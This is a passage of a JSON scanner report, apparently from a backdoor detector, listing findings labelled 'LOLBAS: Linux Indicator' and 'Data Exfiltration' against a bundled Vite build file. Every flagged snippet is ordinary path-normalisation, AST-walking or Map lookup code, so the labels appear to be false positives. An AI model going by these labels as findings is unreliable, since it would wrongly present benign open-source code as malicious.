                      "text": "                        parts.splice(dd - 1, 2, ...splin);\n                        if (parts.length === 0)\n                            parts.push('');\n                        dd -= 2;\n                    }\n                }\n            }\n",
                      "markdown": "`                        parts.splice(dd - 1, 2, ...splin);\n                        if (parts.length === 0)\n                            parts.push('');\n                        dd -= 2;\n                    }\n                }\n            }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 4453,
                  "startColumn": 39,
                  "endLine": 4453,
                  "endColumn": 43,
                  "snippet": {
                    "text": "                    const p = parts[dd - 1];\n                    if (p && p !== '.' && p !== '..' && p !== '**') {\n                        didSomething = true;\n                        const needDot = dd === 1 && parts[dd + 1] === '**';\n                        const splin = needDot ? ['.'] : [];\n                        parts.splice(dd - 1, 2, ...splin);\n                        if (parts.length === 0)\n",
                    "rendered": {
                      "text": "                    const p = parts[dd - 1];\n                    if (p && p !== '.' && p !== '..' && p !== '**') {\n                        didSomething = true;\n                        const needDot = dd === 1 && parts[dd + 1] === '**';\n                        const splin = needDot ? ['.'] : [];\n                        parts.splice(dd - 1, 2, ...splin);\n                        if (parts.length === 0)\n",
                      "markdown": "`                    const p = parts[dd - 1];\n                    if (p && p !== '.' && p !== '..' && p !== '**') {\n                        didSomething = true;\n                        const needDot = dd === 1 && parts[dd + 1] === '**';\n                        const splin = needDot ? ['.'] : [];\n                        parts.splice(dd - 1, 2, ...splin);\n                        if (parts.length === 0)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 4449,
                  "startColumn": 55,
                  "endLine": 4449,
                  "endColumn": 59,
                  "snippet": {
                    "text": "                }\n                // <pre>/<p>/../<rest> -> <pre>/<rest>\n                let dd = 0;\n                while (-1 !== (dd = parts.indexOf('..', dd + 1))) {\n                    const p = parts[dd - 1];\n                    if (p && p !== '.' && p !== '..' && p !== '**') {\n                        didSomething = true;\n",
                    "rendered": {
                      "text": "                }\n                // <pre>/<p>/../<rest> -> <pre>/<rest>\n                let dd = 0;\n                while (-1 !== (dd = parts.indexOf('..', dd + 1))) {\n                    const p = parts[dd - 1];\n                    if (p && p !== '.' && p !== '..' && p !== '**') {\n                        didSomething = true;\n",
                      "markdown": "`                }\n                // <pre>/<p>/../<rest> -> <pre>/<rest>\n                let dd = 0;\n                while (-1 !== (dd = parts.indexOf('..', dd + 1))) {\n                    const p = parts[dd - 1];\n                    if (p && p !== '.' && p !== '..' && p !== '**') {\n                        didSomething = true;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 4448,
                  "startColumn": 19,
                  "endLine": 4448,
                  "endColumn": 23,
                  "snippet": {
                    "text": "                    }\n                }\n                // <pre>/<p>/../<rest> -> <pre>/<rest>\n                let dd = 0;\n                while (-1 !== (dd = parts.indexOf('..', dd + 1))) {\n                    const p = parts[dd - 1];\n                    if (p && p !== '.' && p !== '..' && p !== '**') {\n",
                    "rendered": {
                      "text": "                    }\n                }\n                // <pre>/<p>/../<rest> -> <pre>/<rest>\n                let dd = 0;\n                while (-1 !== (dd = parts.indexOf('..', dd + 1))) {\n                    const p = parts[dd - 1];\n                    if (p && p !== '.' && p !== '..' && p !== '**') {\n",
                      "markdown": "`                    }\n                }\n                // <pre>/<p>/../<rest> -> <pre>/<rest>\n                let dd = 0;\n                while (-1 !== (dd = parts.indexOf('..', dd + 1))) {\n                    const p = parts[dd - 1];\n                    if (p && p !== '.' && p !== '..' && p !== '**') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 4364,
                  "startColumn": 19,
                  "endLine": 4364,
                  "endColumn": 23,
                  "snippet": {
                    "text": "                if (p && p !== '.' && p !== '..' && p !== '**') {\n                    didSomething = true;\n                    parts.splice(dd - 1, 2);\n                    dd -= 2;\n                }\n            }\n        } while (didSomething);\n",
                    "rendered": {
                      "text": "                if (p && p !== '.' && p !== '..' && p !== '**') {\n                    didSomething = true;\n                    parts.splice(dd - 1, 2);\n                    dd -= 2;\n                }\n            }\n        } while (didSomething);\n",
                      "markdown": "`                if (p && p !== '.' && p !== '..' && p !== '**') {\n                    didSomething = true;\n                    parts.splice(dd - 1, 2);\n                    dd -= 2;\n                }\n            }\n        } while (didSomething);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 4359,
                  "startColumn": 51,
                  "endLine": 4359,
                  "endColumn": 55,
                  "snippet": {
                    "text": "            }\n            // <pre>/<p>/../<rest> -> <pre>/<rest>\n            let dd = 0;\n            while (-1 !== (dd = parts.indexOf('..', dd + 1))) {\n                const p = parts[dd - 1];\n                if (p && p !== '.' && p !== '..' && p !== '**') {\n                    didSomething = true;\n",
                    "rendered": {
                      "text": "            }\n            // <pre>/<p>/../<rest> -> <pre>/<rest>\n            let dd = 0;\n            while (-1 !== (dd = parts.indexOf('..', dd + 1))) {\n                const p = parts[dd - 1];\n                if (p && p !== '.' && p !== '..' && p !== '**') {\n                    didSomething = true;\n",
                      "markdown": "`            }\n            // <pre>/<p>/../<rest> -> <pre>/<rest>\n            let dd = 0;\n            while (-1 !== (dd = parts.indexOf('..', dd + 1))) {\n                const p = parts[dd - 1];\n                if (p && p !== '.' && p !== '..' && p !== '**') {\n                    didSomething = true;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 4358,
                  "startColumn": 15,
                  "endLine": 4358,
                  "endColumn": 19,
                  "snippet": {
                    "text": "                }\n            }\n            // <pre>/<p>/../<rest> -> <pre>/<rest>\n            let dd = 0;\n            while (-1 !== (dd = parts.indexOf('..', dd + 1))) {\n                const p = parts[dd - 1];\n                if (p && p !== '.' && p !== '..' && p !== '**') {\n",
                    "rendered": {
                      "text": "                }\n            }\n            // <pre>/<p>/../<rest> -> <pre>/<rest>\n            let dd = 0;\n            while (-1 !== (dd = parts.indexOf('..', dd + 1))) {\n                const p = parts[dd - 1];\n                if (p && p !== '.' && p !== '..' && p !== '**') {\n",
                      "markdown": "`                }\n            }\n            // <pre>/<p>/../<rest> -> <pre>/<rest>\n            let dd = 0;\n            while (-1 !== (dd = parts.indexOf('..', dd + 1))) {\n                const p = parts[dd - 1];\n                if (p && p !== '.' && p !== '..' && p !== '**') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 2679,
                  "startColumn": 17,
                  "endLine": 2679,
                  "endColumn": 23,
                  "snippet": {
                    "text": "            }\n        },\n        leave(n) {\n            const node = n;\n            if (node[propertyName])\n                scope = scope.parent;\n        }\n",
                    "rendered": {
                      "text": "            }\n        },\n        leave(n) {\n            const node = n;\n            if (node[propertyName])\n                scope = scope.parent;\n        }\n",
                      "markdown": "`            }\n        },\n        leave(n) {\n            const node = n;\n            if (node[propertyName])\n                scope = scope.parent;\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 2619,
                  "startColumn": 17,
                  "endLine": 2619,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    let scope = new Scope();\n    walk$3(ast, {\n        enter(n, parent) {\n            const node = n;\n            // function foo () {...}\n            // class Foo {...}\n            if (/(Function|Class)Declaration/.test(node.type)) {\n",
                    "rendered": {
                      "text": "    let scope = new Scope();\n    walk$3(ast, {\n        enter(n, parent) {\n            const node = n;\n            // function foo () {...}\n            // class Foo {...}\n            if (/(Function|Class)Declaration/.test(node.type)) {\n",
                      "markdown": "`    let scope = new Scope();\n    walk$3(ast, {\n        enter(n, parent) {\n            const node = n;\n            // function foo () {...}\n            // class Foo {...}\n            if (/(Function|Class)Declaration/.test(node.type)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 442,
                  "startColumn": 4,
                  "endLine": 442,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\t\t\t\tthis.leave.call(this.context, node, parent, prop, index);\n\n\t\t\t\tif (this.replacement) {\n\t\t\t\t\tnode = this.replacement;\n\t\t\t\t\tthis.replace(parent, prop, index, node);\n\t\t\t\t}\n\n",
                    "rendered": {
                      "text": "\t\t\t\tthis.leave.call(this.context, node, parent, prop, index);\n\n\t\t\t\tif (this.replacement) {\n\t\t\t\t\tnode = this.replacement;\n\t\t\t\t\tthis.replace(parent, prop, index, node);\n\t\t\t\t}\n\n",
                      "markdown": "`\t\t\t\tthis.leave.call(this.context, node, parent, prop, index);\n\n\t\t\t\tif (this.replacement) {\n\t\t\t\t\tnode = this.replacement;\n\t\t\t\t\tthis.replace(parent, prop, index, node);\n\t\t\t\t}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 395,
                  "startColumn": 4,
                  "endLine": 395,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\t\t\t\tthis.enter.call(this.context, node, parent, prop, index);\n\n\t\t\t\tif (this.replacement) {\n\t\t\t\t\tnode = this.replacement;\n\t\t\t\t\tthis.replace(parent, prop, index, node);\n\t\t\t\t}\n\n",
                    "rendered": {
                      "text": "\t\t\t\tthis.enter.call(this.context, node, parent, prop, index);\n\n\t\t\t\tif (this.replacement) {\n\t\t\t\t\tnode = this.replacement;\n\t\t\t\t\tthis.replace(parent, prop, index, node);\n\t\t\t\t}\n\n",
                      "markdown": "`\t\t\t\tthis.enter.call(this.context, node, parent, prop, index);\n\n\t\t\t\tif (this.replacement) {\n\t\t\t\t\tnode = this.replacement;\n\t\t\t\t\tthis.replace(parent, prop, index, node);\n\t\t\t\t}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 64752,
                  "startColumn": 54,
                  "endLine": 64752,
                  "endColumn": 59,
                  "snippet": {
                    "text": "                    }\n                  } else {\n                    const removedPureCssFiles = removedPureCssFilesCache.get(config);\n                    const chunk3 = removedPureCssFiles.get(filename);\n                    if (chunk3) {\n                      if (chunk3.viteMetadata.importedCss.size) {\n                        chunk3.viteMetadata.importedCss.forEach((file2) => {\n",
                    "rendered": {
                      "text": "                    }\n                  } else {\n                    const removedPureCssFiles = removedPureCssFilesCache.get(config);\n                    const chunk3 = removedPureCssFiles.get(filename);\n                    if (chunk3) {\n                      if (chunk3.viteMetadata.importedCss.size) {\n                        chunk3.viteMetadata.importedCss.forEach((file2) => {\n",
                      "markdown": "`                    }\n                  } else {\n                    const removedPureCssFiles = removedPureCssFilesCache.get(config);\n                    const chunk3 = removedPureCssFiles.get(filename);\n                    if (chunk3) {\n                      if (chunk3.viteMetadata.importedCss.size) {\n                        chunk3.viteMetadata.importedCss.forEach((file2) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 64751,
                  "startColumn": 72,
                  "endLine": 64751,
                  "endColumn": 77,
                  "snippet": {
                    "text": "                      });\n                    }\n                  } else {\n                    const removedPureCssFiles = removedPureCssFilesCache.get(config);\n                    const chunk3 = removedPureCssFiles.get(filename);\n                    if (chunk3) {\n                      if (chunk3.viteMetadata.importedCss.size) {\n",
                    "rendered": {
                      "text": "                      });\n                    }\n                  } else {\n                    const removedPureCssFiles = removedPureCssFilesCache.get(config);\n                    const chunk3 = removedPureCssFiles.get(filename);\n                    if (chunk3) {\n                      if (chunk3.viteMetadata.importedCss.size) {\n",
                      "markdown": "`                      });\n                    }\n                  } else {\n                    const removedPureCssFiles = removedPureCssFilesCache.get(config);\n                    const chunk3 = removedPureCssFiles.get(filename);\n                    if (chunk3) {\n                      if (chunk3.viteMetadata.importedCss.size) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 64633,
                  "startColumn": 60,
                  "endLine": 64633,
                  "endColumn": 65,
                  "snippet": {
                    "text": "        return;\n      }\n      if (!insertPreload) {\n        const removedPureCssFiles = removedPureCssFilesCache.get(config);\n        if (removedPureCssFiles && removedPureCssFiles.size > 0) {\n          for (const file in bundle) {\n            const chunk = bundle[file];\n",
                    "rendered": {
                      "text": "        return;\n      }\n      if (!insertPreload) {\n        const removedPureCssFiles = removedPureCssFilesCache.get(config);\n        if (removedPureCssFiles && removedPureCssFiles.size > 0) {\n          for (const file in bundle) {\n            const chunk = bundle[file];\n",
                      "markdown": "`        return;\n      }\n      if (!insertPreload) {\n        const removedPureCssFiles = removedPureCssFilesCache.get(config);\n        if (removedPureCssFiles && removedPureCssFiles.size > 0) {\n          for (const file in bundle) {\n            const chunk = bundle[file];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 63789,
                  "startColumn": 33,
                  "endLine": 63789,
                  "endColumn": 38,
                  "snippet": {
                    "text": "  return !isJSRequest(url) && !isCSSRequest(url);\n}\nfunction extractImportedBindings(id, source, importSpec, importedBindings) {\n  let bindings = importedBindings.get(id);\n  if (!bindings) {\n    bindings = /* @__PURE__ */ new Set();\n    importedBindings.set(id, bindings);\n",
                    "rendered": {
                      "text": "  return !isJSRequest(url) && !isCSSRequest(url);\n}\nfunction extractImportedBindings(id, source, importSpec, importedBindings) {\n  let bindings = importedBindings.get(id);\n  if (!bindings) {\n    bindings = /* @__PURE__ */ new Set();\n    importedBindings.set(id, bindings);\n",
                      "markdown": "`  return !isJSRequest(url) && !isCSSRequest(url);\n}\nfunction extractImportedBindings(id, source, importSpec, importedBindings) {\n  let bindings = importedBindings.get(id);\n  if (!bindings) {\n    bindings = /* @__PURE__ */ new Set();\n    importedBindings.set(id, bindings);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 63508,
                  "startColumn": 64,
                  "endLine": 63508,
                  "endColumn": 69,
                  "snippet": {
                    "text": "      continue;\n    }\n    if (node.id && node.acceptedHmrExports && importer.importedBindings) {\n      const importedBindingsFromNode = importer.importedBindings.get(node.id);\n      if (importedBindingsFromNode && areAllImportsAccepted(importedBindingsFromNode, node.acceptedHmrExports)) {\n        continue;\n      }\n",
                    "rendered": {
                      "text": "      continue;\n    }\n    if (node.id && node.acceptedHmrExports && importer.importedBindings) {\n      const importedBindingsFromNode = importer.importedBindings.get(node.id);\n      if (importedBindingsFromNode && areAllImportsAccepted(importedBindingsFromNode, node.acceptedHmrExports)) {\n        continue;\n      }\n",
                      "markdown": "`      continue;\n    }\n    if (node.id && node.acceptedHmrExports && importer.importedBindings) {\n      const importedBindingsFromNode = importer.importedBindings.get(node.id);\n      if (importedBindingsFromNode && areAllImportsAccepted(importedBindingsFromNode, node.acceptedHmrExports)) {\n        continue;\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 62951,
                  "startColumn": 42,
                  "endLine": 62951,
                  "endColumn": 47,
                  "snippet": {
                    "text": "    onFileAddUnlink(file, true);\n  });\n  hot.on(\"vite:invalidate\", async ({ path: path2, message }) => {\n    const mod = moduleGraph.urlToModuleMap.get(path2);\n    if (mod && mod.isSelfAccepting && mod.lastHMRTimestamp > 0 && !mod.lastHMRInvalidationReceived) {\n      mod.lastHMRInvalidationReceived = true;\n      config.logger.info(\n",
                    "rendered": {
                      "text": "    onFileAddUnlink(file, true);\n  });\n  hot.on(\"vite:invalidate\", async ({ path: path2, message }) => {\n    const mod = moduleGraph.urlToModuleMap.get(path2);\n    if (mod && mod.isSelfAccepting && mod.lastHMRTimestamp > 0 && !mod.lastHMRInvalidationReceived) {\n      mod.lastHMRInvalidationReceived = true;\n      config.logger.info(\n",
                      "markdown": "`    onFileAddUnlink(file, true);\n  });\n  hot.on(\"vite:invalidate\", async ({ path: path2, message }) => {\n    const mod = moduleGraph.urlToModuleMap.get(path2);\n    if (mod && mod.isSelfAccepting && mod.lastHMRTimestamp > 0 && !mod.lastHMRInvalidationReceived) {\n      mod.lastHMRInvalidationReceived = true;\n      config.logger.info(\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 62511,
                  "startColumn": 85,
                  "endLine": 62511,
                  "endColumn": 90,
                  "snippet": {
                    "text": "   * @internal\n   */\n  _getUnresolvedUrlToModule(url, ssr) {\n    return (ssr ? this._ssrUnresolvedUrlToModuleMap : this._unresolvedUrlToModuleMap).get(url);\n  }\n  /**\n   * @internal\n",
                    "rendered": {
                      "text": "   * @internal\n   */\n  _getUnresolvedUrlToModule(url, ssr) {\n    return (ssr ? this._ssrUnresolvedUrlToModuleMap : this._unresolvedUrlToModuleMap).get(url);\n  }\n  /**\n   * @internal\n",
                      "markdown": "`   * @internal\n   */\n  _getUnresolvedUrlToModule(url, ssr) {\n    return (ssr ? this._ssrUnresolvedUrlToModuleMap : this._unresolvedUrlToModuleMap).get(url);\n  }\n  /**\n   * @internal\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 62505,
                  "startColumn": 31,
                  "endLine": 62505,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    }\n  }\n  getModuleByEtag(etag) {\n    return this.etagToModuleMap.get(etag);\n  }\n  /**\n   * @internal\n",
                    "rendered": {
                      "text": "    }\n  }\n  getModuleByEtag(etag) {\n    return this.etagToModuleMap.get(etag);\n  }\n  /**\n   * @internal\n",
                      "markdown": "`    }\n  }\n  getModuleByEtag(etag) {\n    return this.etagToModuleMap.get(etag);\n  }\n  /**\n   * @internal\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 62466,
                  "startColumn": 49,
                  "endLine": 62466,
                  "endColumn": 54,
                  "snippet": {
                    "text": "  // hmr in the importing css file.\n  createFileOnlyEntry(file) {\n    file = normalizePath$3(file);\n    let fileMappedModules = this.fileToModulesMap.get(file);\n    if (!fileMappedModules) {\n      fileMappedModules = /* @__PURE__ */ new Set();\n      this.fileToModulesMap.set(file, fileMappedModules);\n",
                    "rendered": {
                      "text": "  // hmr in the importing css file.\n  createFileOnlyEntry(file) {\n    file = normalizePath$3(file);\n    let fileMappedModules = this.fileToModulesMap.get(file);\n    if (!fileMappedModules) {\n      fileMappedModules = /* @__PURE__ */ new Set();\n      this.fileToModulesMap.set(file, fileMappedModules);\n",
                      "markdown": "`  // hmr in the importing css file.\n  createFileOnlyEntry(file) {\n    file = normalizePath$3(file);\n    let fileMappedModules = this.fileToModulesMap.get(file);\n    if (!fileMappedModules) {\n      fileMappedModules = /* @__PURE__ */ new Set();\n      this.fileToModulesMap.set(file, fileMappedModules);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 62445,
                  "startColumn": 53,
                  "endLine": 62445,
                  "endColumn": 58,
                  "snippet": {
                    "text": "        mod.id = resolvedId;\n        this.idToModuleMap.set(resolvedId, mod);\n        const file = mod.file = cleanUrl(resolvedId);\n        let fileMappedModules = this.fileToModulesMap.get(file);\n        if (!fileMappedModules) {\n          fileMappedModules = /* @__PURE__ */ new Set();\n          this.fileToModulesMap.set(file, fileMappedModules);\n",
                    "rendered": {
                      "text": "        mod.id = resolvedId;\n        this.idToModuleMap.set(resolvedId, mod);\n        const file = mod.file = cleanUrl(resolvedId);\n        let fileMappedModules = this.fileToModulesMap.get(file);\n        if (!fileMappedModules) {\n          fileMappedModules = /* @__PURE__ */ new Set();\n          this.fileToModulesMap.set(file, fileMappedModules);\n",
                      "markdown": "`        mod.id = resolvedId;\n        this.idToModuleMap.set(resolvedId, mod);\n        const file = mod.file = cleanUrl(resolvedId);\n        let fileMappedModules = this.fileToModulesMap.get(file);\n        if (!fileMappedModules) {\n          fileMappedModules = /* @__PURE__ */ new Set();\n          this.fileToModulesMap.set(file, fileMappedModules);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 62437,
                  "startColumn": 30,
                  "endLine": 62437,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        ssr,\n        resolved\n      );\n      mod = this.idToModuleMap.get(resolvedId);\n      if (!mod) {\n        mod = new ModuleNode(url, setIsSelfAccepting);\n        if (meta) mod.meta = meta;\n",
                    "rendered": {
                      "text": "        ssr,\n        resolved\n      );\n      mod = this.idToModuleMap.get(resolvedId);\n      if (!mod) {\n        mod = new ModuleNode(url, setIsSelfAccepting);\n        if (meta) mod.meta = meta;\n",
                      "markdown": "`        ssr,\n        resolved\n      );\n      mod = this.idToModuleMap.get(resolvedId);\n      if (!mod) {\n        mod = new ModuleNode(url, setIsSelfAccepting);\n        if (meta) mod.meta = meta;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 62281,
                  "startColumn": 32,
                  "endLine": 62281,
                  "endColumn": 37,
                  "snippet": {
